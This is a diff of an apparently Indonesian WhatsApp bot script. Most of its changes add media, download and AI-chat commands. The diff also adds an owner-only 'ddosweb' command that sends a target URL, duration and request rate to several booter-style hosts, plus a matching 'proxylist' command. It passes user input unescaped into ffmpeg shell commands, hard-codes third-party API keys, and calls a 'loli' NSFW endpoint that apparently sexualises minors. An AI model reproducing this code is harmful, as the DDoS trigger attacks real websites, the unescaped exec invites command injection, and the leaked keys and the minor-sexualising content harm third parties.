@@ -30,6 +30,7 @@ const { Primbon } = require('scrape-primbon')
 const { Brainly } = require("brainly-scraper-v2");
 const { translate } = require("@vitalets/google-translate-api")
 const { Pixiv } = require('@ibaraki-douji/pixivts')
+const { fileTypeFromBuffer } = require('file-type')
 const pixiv = new Pixiv()
 const googleTTS = require('google-tts-api')
 const ytdl = require("ytdl-core")
@@ -670,7 +671,8 @@ Prefix :   ${prefix}
 ╰┈➤( 𝘼𝙄 & 𝙀𝙉𝘾𝙃𝘼𝙉𝙏 )
 ━━━━━━━━━━━━━━━━━━━
 ➤ ai/openai4/chatgptv4
-➤ nero/aibb/blackbox
+➤ blackbox
+➤ nero/aibb
 ➤ chan
 ➤ bard/bardai
 ➤ bardimg (reply gambar + masukin teks)
@@ -726,6 +728,11 @@ Prefix :   ${prefix}
 ➤ zcoderef
 ➤ zcoderev
 ➤ zcodedoc
+━━━━━━━━━━━━━━━━━━━
+╰┈➤( 𝘿𝘿𝙊𝙎 𝙒𝙀𝘽𝙎𝙄𝙏𝙀 )
+━━━━━━━━━━━━━━━━━━━
+➤ ddosweb ( Thanks to Shield )
+➤ proxylist
 ━━━━━━━━━━━━━━━━━━━
 ╰┈➤( 𝙋𝙀𝙉𝘾𝘼𝙍𝙄𝘼𝙉 )
 ━━━━━━━━━━━━━━━━━━━
@@ -789,6 +796,26 @@ Prefix :   ${prefix}
 ➤ tovn
 ➤ tts/gtts (Masukin Teks)
 ━━━━━━━━━━━━━━━━━━━
+╰┈➤( 𝙀𝘿𝙄𝙏 𝙎𝙊𝙐𝙉𝘿 )
+━━━━━━━━━━━━━━━━━━━
+➤ bass
+➤ blown
+➤ deep
+➤ earrape
+➤ fast
+➤ slow
+➤ fat
+➤ nightcore
+➤ reverse
+➤ robot
+➤ smooth
+➤ squirrel
+━━━━━━━━━━━━━━━━━━━
+╰┈➤( 𝙀𝘿𝙄𝙏 𝙑𝙊𝙇𝙐𝙈𝙀 )
+━━━━━━━━━━━━━━━━━━━
+➤ volaudio (Angka 1-10)
+➤ volvideo (Angka 1-10
+━━━━━━━━━━━━━━━━━━━
 ╰┈➤( 𝙉𝙎𝙁𝙒 𝙈𝙀𝙉𝙐 )
 ━━━━━━━━━━━━━━━━━━━
 ➤ hentai
@@ -798,6 +825,7 @@ Prefix :   ${prefix}
 ➤ blowjob
 ➤ pussy
 ➤ cum
+➤ femdom
 ➤ masturbation
 ➤ bdsm
 ➤ oppai
@@ -976,6 +1004,33 @@ async function obfus(query) {
         reject(e)
     }
     })
+}
+
+//TEST DOOD
+const regexPattern = /(?:doodstream|dood|dooood|ds2play)(?:.*)\/(?:d\/|e\/)([A-z0-9]+)/;
+
+async function generatePlayUrl(inputText) {
+    const match = inputText.match(regexPattern);
+    if (!match) {
+        console.error("Input tidak sesuai dengan regex pattern.");
+        throw new Error("Input tidak sesuai dengan regex pattern.");
+    }
+
+    const encryptedId = match[1];
+    const apiUrl = `https://api.delivrjs.workers.dev/encrypt/${encryptedId}`;
+
+    try {
+        const response = await fetch(apiUrl);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.json();
+        const playUrl = `https://xstreampro.pages.dev/play.html?id=${data.encryptId}&host=doodstream`;
+        return playUrl;
+    } catch (error) {
+        console.error("Terjadi kesalahan dalam fetch:", error);
+        throw error;
+    }
 }
 
 //SCRAPE YANDERE by ShinChan
@@ -1288,48 +1343,24 @@ const fetchData = async (requestData) => {
         throw error;
     }
 };
-
-//QC STIKER
-async function Quotly(obj) {
-  let json;
-
-  try {
-    json = await axios.post("https://quote-api.rippanteq7.repl.co/generate", obj, {
-      headers: {
-        "Content-Type": "application/json"
-      }
-    });
-  } catch (e) {
-    try {
-      json = await axios.post("https://quote-api-1.jigarvarma2005.repl.co/generate", obj, {
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-    } catch (e) {
-      try {
-        json = await axios.post("https://qc-api.rizzlogy.repl.co/generate", obj, {
-          headers: {
-            "Content-Type": "application/json"
-          }
-        });
-      } catch (e) {
-        try {
-          json = await axios.post("https://quote-api.ghost19ui.repl.co/generate", obj, {
-            headers: {
-              "Content-Type": "application/json"
-            }
-          });
-        } catch (e) {
-          return e;
-        }
-      }
-    }
-  }
-
-  const results = json.data.result.image;
-  const buffer = Buffer.from(results, "base64");
-  return buffer;
+//FILEIO
+const fileIO = async buffer => {
+    const {
+        ext,
+        mime
+    } = await fileTypeFromBuffer(buffer) || {}
+    let form = new FormData()
+    const blob = new Blob([buffer.toArrayBuffer()], {
+        type: mime
+    })
+    form.append('file', blob, 'tmp.' + ext)
+    let res = await fetch('https://file.io/?expires=1d', { // 1 Day Expiry Date
+        method: 'POST',
+        body: form
+    })
+    let json = await res.json()
+    if (!json.success) throw json
+    return json.link
 }
 
 function getRandomHexColor() {
@@ -2479,8 +2510,8 @@ if (!isPremgc && !isCreator) return replytolak(premiumgc)
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
     let response = await fetchJson(`https://aemt.me/ai/c-ai?prompt=Nama saya ShinChan, saya di tugaskan untuk membantu anda&text=${text}`)
-    let chanai = response.result
-conn.sendMessage(m.chat, {
+    let chanai = await response.result
+await conn.sendMessage(m.chat, {
     text: chanai, 
     contextInfo: {
     externalAdReply :{
@@ -2579,21 +2610,51 @@ m.reply(global.wait)
 					}
 }
 break
-case 'nero': case 'neroai': case 'aibb': case 'blackbox': {
+case 'nero': case 'neroai': case 'aibb': {
 if (!isPremgc && !isCreator) return replytolak(premiumgc)
 if (!text) return m.reply('Apa yang bisa saya bantu?')
   let error33;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-    let aibb = await fetch(`https://vihangayt.me/tools/blackboxv4?q=${text}`)
+    let aibb = await fetch(`https://api.caliph.biz.id/api/ai/blackbox?q=${text}&apikey=caliphkey`)
         let botilegal = await aibb.json()
 conn.sendMessage(m.chat, {
-    text: botilegal.data, 
+    text: botilegal.result, 
     contextInfo: {
     externalAdReply :{
     mediaUrl: 'https://instagram.com/shinchan.senpai', 
     mediaType: 1,
     title: '𝘾𝙃𝘼𝙏𝙂𝙋𝙏 𝘽𝙡𝙖𝙘𝙠𝘽𝙤𝙭 𝙑4',
+    body: `${tanggal} ××× ${time}`, 
+    thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
+    sourceUrl: 'https://instagram.com/shinchan.senpai',
+    renderLargerThumbnail: true, 
+    showAdAttribution: true
+    }}}, { quoted: m})
+} catch (er) {
+					error33 = true;
+				} finally {
+					if (error33) {
+						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
+					}
+					}
+}
+break
+case 'blackbox': {
+if (!isPremgc && !isCreator) return replytolak(premiumgc)
+if (!text) return m.reply('Apa yang bisa saya bantu?')
+  let error33;
+try {
+await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    let aibb = await fetch(`https://aemt.me/blackbox?text=${text}`)
+        let botilegal2 = await aibb.json()
+conn.sendMessage(m.chat, {
+    text: botilegal2.result, 
+    contextInfo: {
+    externalAdReply :{
+    mediaUrl: 'https://instagram.com/shinchan.senpai', 
+    mediaType: 1,
+    title: '𝘾𝙃𝘼𝙏𝙂𝙋𝙏 𝘽𝙡𝙖𝙘𝙠𝘽𝙤𝙭',
     body: `${tanggal} ××× ${time}`, 
     thumbnailUrl: 'https://telegra.ph/file/dd5672b0bfc12350052e4.jpg', 
     sourceUrl: 'https://instagram.com/shinchan.senpai',
@@ -2659,10 +2720,7 @@ try {
          break
 case 'loli': {
 try {
-await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-let loli = `https://api.shieldid.site/api/loli?apikey=brnMmZCqcvJoNUxv`
-//await conn.sendImage(m.chat, response, done, m)
-await conn.sendMessage(m.chat, { image: { url: loli }, caption: done }, { quoted: m })
+await conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=GataDios` }, caption: done }, { quoted: m })
 } catch (error) {
         console.error(error);
         replyerror('ERROR.');
@@ -2709,6 +2767,15 @@ conn.sendMessage(from, { image: { url: `https://api.zenext.xyz/api/morensfw/bdsm
 						replyerror("Yah Proses Gagal :(");
 					}
 					}
+break
+case 'femdom': {
+try {
+conn.sendMessage(m.chat, { image: { url: `https://api.zenext.xyz/api/morensfw/femdom?apikey=zenzkey_133c4d90d6` }, caption: done }, { quoted: m })
+} catch (error) {
+        console.error(error);
+        replyerror('ERROR.');
+    }
+}
 break
 case 'masturbation' :
 let error7;
@@ -3246,7 +3313,7 @@ if (!text) throw `*🚩 Contoh:* ${usedPrefix + command} Lathi`;
   let teks = '';
 let error18;
 try {
-    const api = await fetch(`https://api.betabotz.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
+    const api = await fetch(`https://api.betabotz.eu.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
     let json = await api.json();
     let res = json.result.data;    
     for (let i in res) {
@@ -3289,6 +3356,9 @@ if (!args[0]) {
     if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
     try {
     await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Video dan Audio akan Dikirim dalam obrolan pribadi.`)
+}
         const tiktokData = await tryServer1(args[0]);
 
         if (!tiktokData) {
@@ -3308,9 +3378,9 @@ if (!args[0]) {
 
         if (videoURL || videoURLWatermark) {
            // await conn.sendFile2(m.chat, videoURL, 'tiktok.mp4', `${done}\n\n${infonya_gan}`, m);
-           await conn.sendMessage(m.chat, { video : { url : videoURL }, mimetype: 'video/mp4', caption : `${done}\n\n${infonya_gan}` }, { quoted : m })
+           await conn.sendMessage(m.sender, { video : { url : videoURL }, mimetype: 'video/mp4', caption : `${done}\n\n${infonya_gan}` }, { quoted : m })
     }
-    await conn.sendMessage(m.chat, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })
+    await conn.sendMessage(m.sender, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })
               } catch (errornya) {
             // Jika server kedua juga gagal, tangani error di sini
             replyerror(`Error: ${errornya}`);
@@ -3323,20 +3393,23 @@ if (!args[0]) {
 if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
     try {
         await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Audio akan Dikirim dalam obrolan pribadi.`)
+}
         const tiktokData = await tryServer1(args[0]);
 
         if (!tiktokData) {
             throw 'Gagal mendownload Audio!';
         }
-            await conn.sendMessage(m.chat, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })
+
+            await conn.sendMessage(m.sender, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })
 
         } catch (errornya) {
             // Jika server kedua juga gagal, tangani error di sini
             replyerror(`Error: ${errornya}`);
         };
 break
-case 'ttimg': case 'tiktokslide': case 'ttslide': {
+/*case 'ttimg': case 'tiktokslide': case 'ttslide': {
         if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
         if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
         let error19;
@@ -3356,6 +3429,29 @@ await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 						replyerror("Yah Proses Gagal :(");
 					}
 					}
+            }
+break*/
+case 'ttimg': case 'tiktokslide': case 'ttslide': {
+        if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
+        if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
+try {
+await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Foto akan Dikirim dalam obrolan pribadi.`)
+}
+const tiktokData = await tryServer1(args[0]);
+
+        if (!tiktokData) {
+            throw 'Gagal mendownload video!';
+        }
+
+    for (let tt of tiktokData.images) {
+      await conn.sendImage(m.sender, tt.url, done, m);
+    }
+} catch (error) {
+        console.error(error);
+        replyerror(`Yah Proses Gagal:(`);
+    }
             }
 break
 /*case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt': {
@@ -3524,11 +3620,12 @@ query = args.join(" ")
 let error13;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-let res = await fetch(`https://api.lolhuman.xyz/api/pixivdl/${query}?apikey=haikalgans`)
+let res = await fetch(`https://api.lolhuman.xyz/api/pixivdl/${query}?apikey=GataDios`)
 let data = await res.json()
 let memek = data.result
 for (let i of memek.images) {
-await conn.sendFile2(from, i, `image`, done, m)
+//await conn.sendFile2(from, i, `image`, done, m)
+await conn.sendImage(m.chat, i, done, m)
 }
 } catch (er) {
 					error13 = true;
@@ -3573,7 +3670,7 @@ if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Han
 query = args.join(" ")
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=GataDios&query=${query}`)
 get_result = get_result.result
 ini_txt = "🥵𝘿𝘼𝙏𝘼 𝘾𝙊𝘿𝙀 𝙃𝙀𝙉𝙏𝘼𝙄🥵 : \n"
 for (var x of get_result) {
@@ -3751,7 +3848,7 @@ if (!args[0]) return paycall( `Example : ${prefix + command} link`)
 let error16;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-  let res = await fetch(`https://api.lolhuman.xyz/api/ouo?apikey=haikalgans&url=${args[0]}`)
+  let res = await fetch(`https://api.lolhuman.xyz/api/ouo?apikey=GataDios&url=${args[0]}`)
   let data = await res.json()
   let bypassnya = data.result
  await conn.sendMessage(m.chat, { text: bypassnya }, {quoted: blue})
@@ -3769,7 +3866,7 @@ if (!args[0]) return paycall( `Example : ${prefix + command} link`)
 let error17;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-  let res = await fetch(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=haikalgans&url=${args[0]}`)
+  let res = await fetch(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=GataDios&url=${args[0]}`)
   let pemanggil = await res.json()
   let anuan = pemanggil.result
  await conn.sendMessage(m.chat, { text: anuan.dropapk }, {quoted: blue})
@@ -3940,7 +4037,7 @@ replyerror("Yah Error:(.");
 }
 break*/
 //========================INSTAGRAM DL============================//
-case 'igvid': case 'igvideo': case 'igreels': {
+/*case 'igvid': case 'igvideo': case 'igreels': {
 if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
 			let error20;
 try {
@@ -4001,6 +4098,57 @@ await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 						replyerror("Yah Proses Gagal :(");
 					}
 					}
+            }
+break*/
+case 'igvid': case 'igvideo': case 'igreels': {
+if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
+try {
+await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Video akan Dikirim dalam obrolan pribadi.`)
+}
+        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
+            for (let igvid of res.result) {
+           await conn.sendMessage(m.sender, { video: { url: igvid.url }, caption: `${done}` }, { quoted: m })
+            }
+} catch (error) {
+    console.error(error);
+    replyerror(`Error Bang`);
+  }
+            }
+break
+case 'igimg': case 'igfoto': {
+if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
+try {
+await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Foto akan Dikirim dalam obrolan pribadi.`)
+}
+        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
+             for (let igimg of res.result) {
+           await conn.sendMessage(m.sender, { image: { url: igimg.url }, caption: `${done}` }, { quoted: m })
+            }
+} catch (error) {
+    console.error(error);
+    replyerror(`Error Bang`);
+  }
+            }
+break
+case 'igdl': {
+if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CzGnVBMsVdD/?igshid=NTc4MTIwNjQ2YQ==`)
+try {
+await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+    if (!isCreator) {
+await m.reply(`Hai @${m.sender.split('@')[0]} Foto/Video akan Dikirim dalam obrolan pribadi.`)
+}
+        let res = await fetchJson(`https://aemt.me/download/igdl?url=${args[0]}`)
+             for (let igdouble of res.result) {
+           await conn.sendFile2(m.sender, igdouble.url, '', done, m);
+            }
+} catch (error) {
+    console.error(error);
+    replyerror(`Error Bang`);
+  }
             }
 break
 //========================TERABOX DOWNLOAD============================//
@@ -4139,7 +4287,7 @@ m.reply('Id Salah / Anime / episode not found!')
 }
 break
 //========================BRAINLY SCRAPE============================//
-case 'brainly':
+case 'brainly2':
 if (!text) return reply(`Example: ${prefix + command} siapakah sukarno`)
 Brainly.initialize();
 var brainly = new Brainly('id');
@@ -4154,12 +4302,12 @@ ${v.content}${v.attachments.length > 0 ? `\n*Media Url*: ${v.attachments.join(',
 		replybrainly(answer.trim())
 		}
 		break		
-case 'brainly2':
+case 'brainly':
                     if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
                     query = args.join(" ")
                     let error24;
 try {
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=haikalgans&query=${query}`)
+                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=GataDios&query=${query}`)
                     lala = get_result.result
                     ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
                     for (var x of lala) {
@@ -4183,7 +4331,7 @@ case 'ruangguru': case 'roboguru': {
 			let error31;
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-			let { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${query}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
+			let { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=GataDios&query=${query}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
 			var robgur = 'Beberapa Pembahasan Dari Roboguru :\n\n'
 			for (var x of data.result) {
 				robgur += `==============================\n`
@@ -4333,7 +4481,7 @@ await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 *📨 Uploaded:* ${aploud}
 `.trim()
     m.reply(`Sedang Mengunduh File:\n${caption}`)
-conn.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
+await conn.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
   }
 break
 case 'gdrive': {
@@ -4535,30 +4683,37 @@ case 'ringtone': {
 	    }
 	    break
 //========================BUAT EMAIL============================//
-case 'tempmail': {
+
+case 'tempmail': case 'createmail': {
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
-let dataemail = await fetchJson(`https://vihangayt.me/tools/tempmail`)
-let emailjadi = dataemail.data[0]
-let idemaile = dataemail.data[1]
-let tglemail = dataemail.data[2]
-conn.sendMessage(m.chat, {text: `📄Email: ${emailjadi}\n📌Id: ${idemaile}\n📆Tanggal: ${tglemail}`}, {quoted: m})
-} catch (er) {
-  console.error(er);
-  replyerror("Yah Error :(");
-}
-}
-break
-case 'inboxmail': case 'inboxemail': {
-if (!text) return paycall(`Masukan Id Email Yang Sudah kalian buat'`)
-try {
-  let hasilemail = await fetchJson(`https://vihangayt.me/tools/get_inbox_tempmail?q=${text}`);
-    let infoemail = hasilemail.data[0];
-    let inihasilnya = `📄Email: ${infoemail[0].toAddr}\n📝Text: ${infoemail[0].text}\n📊Size: ${infoemail[0].rawSize}\n📈Type: ${infoemail[0].headerSubject}\n📌Link Info: ${infoemail[0].fromAddr}\n🔗Url: ${infoemail[0].downloadUrl}`;
-    conn.sendMessage(m.chat, {text: `${inihasilnya}`}, {quoted: m});
+let data = await fetchJson(`https://dropmail.me/api/graphql/web-test-wgq6m5i?query=mutation%20%7BintroduceSession%20%7Bid%2C%20expiresAt%2C%20addresses%20%7Baddress%7D%7D%7D`)
+let email = data["data"]["introduceSession"]["addresses"][0]["address"];
+let id_ = data["data"]["introduceSession"]["id"];
+let time = data["data"]["introduceSession"]["expiresAt"];
+//await m.reply(`*EMAIL*: ${email}\n*ID:* ${id_}\n*Tanggal:* ${time}`)
+await conn.sendMessage(m.chat, {text: `${email}`}, {quoted: m})
+await conn.sendMessage(m.chat, {text: `${id_}`}, {quoted: m})
 } catch (er) {
   console.error(er);
   m.reply("Tidak Ada Pesan Masuk");
+}
+}
+break
+case 'inboxmail': case 'inboxemail': case 'pesanemail': {
+if (!text) return paycall(`Masukan Id Email Yang Sudah kalian buat'`)
+try {
+let data = await fetchJson(`https://dropmail.me/api/graphql/web-test-wgq6m5i?query=query%20(%24id%3A%20ID!)%20%7Bsession(id%3A%24id)%20%7B%20addresses%20%7Baddress%7D%2C%20mails%7BrawSize%2C%20fromAddr%2C%20toAddr%2C%20downloadUrl%2C%20text%2C%20headerSubject%7D%7D%20%7D&variables=%7B%22id%22%3A%22${text}%22%7D`)
+let email = data["data"]["session"]["mails"][0]["toAddr"];
+let teksnya = data["data"]["session"]["mails"][0]["text"];
+let size = data["data"]["session"]["mails"][0]["rawSize"];
+let type = data["data"]["session"]["mails"][0]["headerSubject"];
+let linkinfo = data["data"]["session"]["mails"][0]["fromAddr"];
+let urlnya = data["data"]["session"]["mails"][0]["downloadUrl"];
+await m.reply(`📄Email: ${email}\n📝Text: ${teksnya}\n📊Size: ${size}\n📈Type: ${type}\n📌Link Info: ${linkinfo}\n🔗Url: ${urlnya}`)
+} catch (er) {
+  console.error(er);
+  m.reply("TIDAK ADA PESAN YANG MASUK");
 }
 }
 break
@@ -4736,9 +4891,13 @@ case 'twtdl': case 'twt': case 'twitter': {
 try {
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
             let res = await fetchJson(`https://api.caliph.biz.id/api/twitter?url=${args[0]}&apikey=caliphkey`);
+            if (res.result?.length) {
             for (let x = 0; x < res.result?.length; x++) {
-      conn.sendMessage(m.chat, { video: { url: res.result[x].url }, caption: done }, { quoted: m})
+     await conn.sendMessage(m.chat, { video: { url: res.result[x].url }, caption: done }, { quoted: m})
             }
+       } else {
+       await m.reply(`Size Terlalu Besar🙂`)
+       }
 } catch (error) {
         console.error(error);
         replyerror(`ERROR`);
@@ -5426,6 +5585,110 @@ try {
 }
 }
 break
+
+case 'doods': {
+const msg = `Input link atau reply link!\n\n*Contoh:*\n${prefix + command} link`;
+    if (args.length >= 1) {
+        text = args.slice(0).join(" ")
+    } else if (m.quoted && m.quoted.text) {
+        text = m.quoted.text
+    } else return m.reply(msg)
+
+    const inputText = text.trim();
+
+    if (!inputText) return m.reply(msg)
+    const match = inputText.match(regexPattern);
+    if (!match) return m.reply("Input tidak sesuai dengan regex pattern.");
+
+    try {
+        const playUrl = await generatePlayUrl(inputText);
+        return m.reply("- *Stream:*\n" + playUrl);
+    } catch (error) {
+        console.error(error);
+        return m.reply('Terjadi kesalahan saat mengunduh video. Silakan coba lagi nanti.');
+    }
+};
+break
+case 'qc': {
+                const {
+                    quote
+                } = require('./lib/quote.js')
+const msg = `Kirim Teks atau reply Teks!`;
+    if (args.length >= 1) {
+        text = args.slice(0).join(" ")
+    } else if (m.quoted && m.quoted.text) {
+        text = m.quoted.text
+    } else return m.reply(msg)
+                let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/ce3fd83d90be494079357.jpg')
+                try {
+                const rest = await quote(text, pushname, ppnyauser)
+                conn.sendImageAsSticker(m.chat, rest.result, m, {
+                    packname: `${global.packname}`,
+                    author: `${global.author}`
+                })
+                } catch (error) {
+        console.error(error);
+        return m.reply('Error Huwaa.');
+    }
+            }
+            break
+case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
+                try {
+                let set
+                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
+                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
+                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
+                if (/earrape/.test(command)) set = '-af volume=12'
+                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
+                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
+                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
+                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
+                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
+                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
+                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
+                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
+                if (/audio/.test(mime)) {
+                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+                let media = await conn.downloadAndSaveMediaMessage(quoted)
+                let ran = getRandom('.mp3')
+                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
+                fs.unlinkSync(media)
+                if (err) return m.reply(err)
+                let buff = fs.readFileSync(ran)
+                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
+                fs.unlinkSync(ran)
+                })
+                } else paytod(`Reply to the audio you want to change with a caption *${prefix + command}*`)
+                } catch (e) {
+                replyerror(e)
+                }
+                break
+case 'volaudio': {
+if (!args.join(" ")) return paytod(`Example: ${prefix + command} 10`)
+media = await conn.downloadAndSaveMediaMessage(quoted, "volume")
+rname = getRandom('.mp3')
+exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
+fs.unlinkSync(media)
+if (err) return paytod('Error!')
+jadie = fs.readFileSync(rname)
+conn.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
+fs.unlinkSync(rname)
+})
+}
+break
+case 'volvideo': {
+if (!args.join(" ")) return paytod(`Example: ${prefix + command} 10`)
+media = await conn.downloadAndSaveMediaMessage(quoted, "volume")
+rname = getRandom('.mp4')
+exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
+fs.unlinkSync(media)
+if (err) return paytod('Error!')
+jadie = fs.readFileSync(rname)
+conn.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
+fs.unlinkSync(rname)
+})
+}
+break
   //(error41)
   
 //GAME
@@ -5657,6 +5920,41 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 }
 }), { userJid: m.chat, quoted: m })
 conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+}
+break
+//========================DDOS WEBSITE============================//
+case 'ddosweb': {
+if (!isCreator) return m.reply(`*khusus Owner*`)
+if (!text) throw `Masukkan URL!\n\n*Contoh:* ${command} www.google.com|60`;
+let [urlnya, jumlahe] = text.split`|`
+if (!urlnya) return paycall(`Example : ${prefix + command} www.google.com|60`)
+if (!jumlahe) return paycall(`Example : ${prefix + command} www.google.com|60`)
+let nyeh = await fetchJson(`https://simanbumbu.shop/rapid?time=${jumlahe}&th=16&ra=250&url=${urlnya}`);
+let nyeh2 = await fetchJson(`https://shieldid.site/rapid?time=${jumlahe}&th=16&ra=250&url=${urlnya}`);
+let nyeh3 = await fetchJson(`https://api2.simanbumbu.shop/rapid?time=${jumlahe}&th=16&ra=250&url=${urlnya}`);
+let nyeh4 = await fetchJson(`https://api3.simanbumbu.shop/rapid?time=${jumlahe}&th=16&ra=250&url=${urlnya}`);
+let nyeh5 = await fetchJson(`https://api4.simanbumbu.shop/rapid?time=${jumlahe}&th=16&ra=250&url=${urlnya}`);
+try {
+await conn.sendMessage(from, {text: done }, {quoted: m})
+} catch (error) {
+        console.error(error);
+        replyerror('MAAF TERJADI KESALAHAN SAAT MENG EXECUTE');
+    }
+}
+break
+case 'proxylist': {
+if (!isCreator) return m.reply(`*khusus Owner*`)
+try {
+let proxynya = await fetchJson(`https://shieldid.site/proxy`);
+let proxynya2 = await fetchJson(`https://simanbumbu.shop/proxy`);
+let proxynya3 = await fetchJson(`https://api2.simanbumbu.shop/proxy`);
+let proxynya4 = await fetchJson(`https://api3.simanbumbu.shop/proxy`);
+let proxynya5 = await fetchJson(`https://api4.simanbumbu.shop/proxy`);
+await conn.sendMessage(from, {text: done }, {quoted: m})
+} catch (error) {
+        console.error(error);
+        replyerror('MAAF TERJADI KESALAHAN SAAT MENGAMBIL PROXY');
+    }
 }
 break
 //========================BUG WHATSAPP=========================//
@@ -5972,11 +6270,17 @@ case 'telestik': {
 		if (m.isGroup && res.length > 30) {
